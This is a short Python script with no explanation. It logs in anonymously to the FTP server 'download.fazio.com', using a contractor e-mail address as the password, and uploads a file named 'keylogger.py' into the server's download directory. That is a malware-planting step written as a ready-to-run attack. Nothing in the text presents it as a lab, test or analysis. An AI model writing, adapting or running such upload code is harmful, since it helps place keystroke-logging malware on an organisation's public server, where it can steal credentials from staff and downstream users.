import ftplib

def main():
  host = "download.fazio.com"
  port = 21
  username = "anonymous"
  password = "contractor@fazio.com"
  ftp = ftplib.FTP(host, username, password)
  ftp.connect(host, port)
  ftp.login()
  ftp.cwd("download")
  ftp.storbinary("STOR keylogger.py", open("keylogger.py", "rb"))
  ftp.close()

if __name__== "__main__":
  main()